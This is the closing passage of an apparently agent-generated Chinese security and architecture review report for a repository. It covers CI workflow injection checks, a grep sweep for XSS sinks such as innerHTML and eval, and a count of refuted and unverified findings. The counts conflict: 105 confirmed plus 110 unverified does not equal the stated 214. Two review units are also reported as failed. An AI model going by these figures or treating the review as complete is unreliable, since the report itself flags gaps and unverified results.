通过 git ls-files 枚举审查范围共 51 个被跟踪文件。逐行精读全部生产源码:apps/asset-delivery-host/src 13 个文件(assetDeliveryHttpHandler/SessionStore/SecurityPolicy/ScannerPolicy/ScannerRuntime、clamAvContentScanner/DaemonReadiness/ScannerFleet、requiredScannerRuntime、sharpRasterTransformer、yaraXScannerRuntime、main)、scripts/verify 等。

##### infra-scripts — CI 工作流 + 脚本 + e2e + 部署 + 根配置

审查了本分块全部 git 跟踪文件:.github/workflows/ 17 个 YAML 全部逐行 Read(重点核查 github.event/inputs/vars 插值——未发现注入到 run 块的不可信表达式;deploy-smoke 的 inputs.image_tag 经 env 传参并加引号,docker-images 的 vars 仅管理员可写;smoke.yml 的 upload-artifact@b7c566a 经联网核实为真实 v6.0.0 提交)。scripts/ 26 个文件中 Read 了 25 个(verify-g0/verify-g2-rootless/accept 等)。

##### sweep-security — 全局安全模式扫描

使用 git grep 在全仓库(排除锁文件,git grep 天然不含 node_modules)按以下模式扫描并逐一 Read 核实:1) dangerouslySetInnerHTML|innerHTML|outerHTML|document.write|eval(|new Function — 命中约 30 处;核实 PdxRichTextEditor(先经 sanitizeRichTextEditorHtml 白名单加 template 解析重建,链接 href 协议白名单)、sanitizeRichTextEditorHtml(template 仅作解析器)、PdxEmbed(受控 src)等;并覆盖 postMessage targetOrigin、私网/SSRF 过滤、凭据脱敏、令牌比较时序、请求体上限、Content-Type 透传等模式。

##### sweep-err-conc — 全局错误处理与并发扫描

(审查代理失败或被跳过)

##### sweep-architecture — 全局架构契约扫描

按 10 项契约逐一用 git grep 定位候选并 Read 核实(仓库根 D:/Projects/prodivix,未进入 node_modules)。共发起约 25 组搜索,核实结论如下:(1) shared 领域化:`git grep "from '@prodivix" -- packages/shared` 0 命中(shared 不反向依赖其它领域包);但列目录加 Read gateway.ts/types.ts/index.ts/iconPolicy.ts 后确认 LLM 整套领域在 shared,`git grep "from '@prodivix/shared" -- packages/ai` 命中反向依赖,即正文 M-A-01 所述违反。其余契约(PIR-current 版本边界、Workspace VFS 唯一真源、Semantic Index 只读投影、Code Authoring 共享基础设施定位、诊断命名空间归属等)未发现违反。

---

## 6. 备注

- **被验证驳回的发现**:本轮对抗验证共**驳回 16 条**原始发现(refuted = 16),按要求**未列入正文**。这些发现经逐条对抗核实后判定不成立(机制错误、不可达或前提与代码事实不符),已从正文剔除。
- **去重**:去重剔除 1 条(dedupDropped = 1),亦未列入正文。
- **正文收录口径**:正文 214 条 = 原始 231 条 − 驳回 16 条 − 去重 1 条;其中 105 条经对抗验证确认(confirmed)、110 条未验证(unverified,均已在各条「验证状态」标注)。
- **未完成单元**:`app-runner-worker`、`sweep-err-conc` 两个审查单元代理失败或被跳过,其覆盖范围内的潜在问题未被本轮扫描覆盖,建议后续补审。
- **未验证发现的处理建议**:110 条未验证发现已给出机制与失败场景,可信度较高但未经独立复现,修复前建议结合对应 verifierNote/代码路径做一次确认。

(报告结束)
